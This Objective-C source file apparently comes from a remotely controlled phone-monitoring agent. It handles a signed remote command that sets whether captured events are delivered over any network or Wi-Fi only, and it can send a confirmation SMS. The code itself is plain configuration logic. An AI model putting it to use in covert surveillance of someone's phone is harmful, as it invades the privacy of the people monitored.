//
//  SetDeliveryMethodProcessor.m
//  RCM
//
//  Created by Ophat Phuetkasickonphasutha on 8/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SetDeliveryMethodProcessor.h"
#import "Preference.h"
#import "PrefEventsCapture.h"
#import "Preference.h"

@interface SetDeliveryMethodProcessor (PrivateAPI)
- (void) setDeliveryMethodException;
- (void) sendReplySMSWithType:(NSInteger)aType;
@end

@implementation SetDeliveryMethodProcessor

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetDeliveryMethodProcessor---->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

- (void) doProcessingCommand {
	DLog (@"SetDeliveryMethodProcessor--->doProcessingCommand");
	
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:3]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"SetDeliveryMethodProcessor" reason:@"Failed signature check"];
	}		
	
	
	NSString *value = [[mRemoteCmdData mArguments] objectAtIndex:2];
	if ([value intValue] == kDeliveryMethodAny ||
		[value intValue] == kDeliveryMethodWifi){
		
		id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
		
		PrefEventsCapture *prefEvents = (PrefEventsCapture *) [prefManager preference:kEvents_Ctrl];
		[prefEvents setMDeliveryMethod:[value intValue]];
		[prefManager savePreferenceAndNotifyChange:prefEvents];
		
		[self sendReplySMSWithType:[value intValue]];
	} else {
		[self setDeliveryMethodException];
	}
	
}

- (void) setDeliveryMethodException{
	DLog (@"SetDeliveryMethodProcessor--->setDeliveryMethodException")
	FxException* exception = [FxException exceptionWithName:@"SetDeliveryMethodException" andReason:@"SetDeliveryMethodProcessor error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}
- (void) sendReplySMSWithType:(NSInteger)aType{
	DLog (@"SetDeliveryMethodProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode] andErrorCode:_SUCCESS_];
	
	NSString *setDeliveryMethodMessage= nil;
	
	if(aType == kDeliveryMethodAny){
		setDeliveryMethodMessage = NSLocalizedString(@"kSetDeliveryMethodAny", @"");
	}else if(aType == kDeliveryMethodWifi){
		setDeliveryMethodMessage = NSLocalizedString(@"kSetDeliveryMethodWIFI", @"");
	}						 
	
	setDeliveryMethodMessage = [messageFormat stringByAppendingString:setDeliveryMethodMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData andReplyMessage:setDeliveryMethodMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] andMessage:setDeliveryMethodMessage];
	}
}
-(void) dealloc {
	[super dealloc];
}


@end
